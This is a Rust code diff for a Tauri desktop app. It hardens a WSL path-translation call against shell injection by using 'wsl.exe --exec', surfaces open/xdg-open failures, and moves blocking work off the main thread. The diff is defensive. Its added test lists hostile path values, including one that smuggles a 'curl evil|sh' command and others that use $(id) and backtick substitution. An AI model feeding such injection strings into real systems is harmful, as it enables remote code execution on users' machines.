@@ -263,17 +263,26 @@ pub trait WslPathRunner {
 
 pub struct WslExeRunner;
 
+/// The `wsl.exe` argv that translates `linux_path`. `--exec` (not `--`)
+/// is deliberate: after a bare `--` wsl.exe hands the command line to the
+/// distro's default shell, which would word-split a spaced path and run
+/// `$(...)`/`;` in a hostile one. `--exec` runs `wslpath` directly, so
+/// the path stays exactly one argument.
+fn wslpath_argv(distro: &str, linux_path: &str) -> Vec<String> {
+    vec![
+        wsl::WSL_EXE.to_string(),
+        "-d".into(),
+        distro.into(),
+        "--exec".into(),
+        "wslpath".into(),
+        "-w".into(),
+        linux_path.into(),
+    ]
+}
+
 impl WslPathRunner for WslExeRunner {
     fn wslpath(&self, distro: &str, linux_path: &str) -> Result<String, String> {
-        let argv = vec![
-            wsl::WSL_EXE.to_string(),
-            "-d".into(),
-            distro.into(),
-            "--".into(),
-            "wslpath".into(),
-            "-w".into(),
-            linux_path.into(),
-        ];
+        let argv = wslpath_argv(distro, linux_path);
         let out = wsl::run(&argv).map_err(|e| format!("translating {linux_path} to a Windows path failed: {e}"))?;
         if !out.status.success() {
             return Err(format!(
@@ -400,6 +409,23 @@ fn spawn_detached(argv: &[String]) -> Result<(), String> {
         cmd.args(args);
     }
     windows_process::no_window(&mut cmd);
+    // `open` and `xdg-open` exit within moments and say why they failed
+    // (an app that isn't there, no handler), so wait and surface it. Editor
+    // binaries stay fire-and-forget, and `explorer.exe` exits 1 even on
+    // success, so neither is waited on.
+    if matches!(argv[0].as_str(), "open" | "xdg-open") {
+        let out = cmd.output().map_err(|e: io::Error| format!("couldn't launch {}: {e}", argv[0]))?;
+        if !out.status.success() {
+            let stderr = String::from_utf8_lossy(&out.stderr);
+            let detail = stderr.trim();
+            return Err(if detail.is_empty() {
+                format!("{} failed ({})", argv[0], out.status)
+            } else {
+                format!("{} failed: {detail}", argv[0])
+            });
+        }
+        return Ok(());
+    }
     let mut child = cmd.spawn().map_err(|e: io::Error| format!("couldn't launch {}: {e}", argv[0]))?;
     std::thread::spawn(move || {
         let _ = child.wait();
@@ -407,9 +433,13 @@ fn spawn_detached(argv: &[String]) -> Result<(), String> {
     Ok(())
 }
 
+/// Async so the PATH/filesystem probing runs off the main thread (a slow
+/// network drive on PATH must not freeze the UI).
 #[tauri::command]
-pub fn editors_list() -> Vec<EditorInfo> {
-    detect_editors(std::env::consts::OS, &RealProbe)
+pub async fn editors_list() -> Result<Vec<EditorInfo>, String> {
+    tauri::async_runtime::spawn_blocking(|| detect_editors(std::env::consts::OS, &RealProbe))
+        .await
+        .map_err(|e| format!("the editor detection task failed: {e}"))
 }
 
 /// Async (like every daemon_manager command) so it runs on the runtime,
@@ -444,7 +474,9 @@ pub async fn open_in_editor(
     })
     .await
     .map_err(|e| format!("the open-in-editor task failed: {e}"))??;
-    spawn_detached(&argv)
+    tauri::async_runtime::spawn_blocking(move || spawn_detached(&argv))
+        .await
+        .map_err(|e| format!("the launch task failed: {e}"))?
 }
 
 #[cfg(test)]
@@ -749,6 +781,17 @@ mod tests {
         )
         .unwrap_err();
         assert!(err.contains("does not exist"), "{err}");
+    }
+
+    #[test]
+    fn wslpath_runs_without_a_shell_and_keeps_the_path_one_argument() {
+        for hostile in ["/home/u/My Project", "/home/u/x; curl evil|sh", "/home/u/$(id)", "/home/u/it's `x`"] {
+            let argv = wslpath_argv("Ubuntu", hostile);
+            assert_eq!(argv.last().map(String::as_str), Some(hostile));
+            assert!(argv.iter().any(|a| a == "--exec"), "must bypass the distro shell: {argv:?}");
+            assert!(!argv.iter().any(|a| a == "--"), "a bare `--` goes through the shell: {argv:?}");
+            assert_eq!(argv.len(), 7, "the path must not be split or merged: {argv:?}");
+        }
     }
 
     #[test]
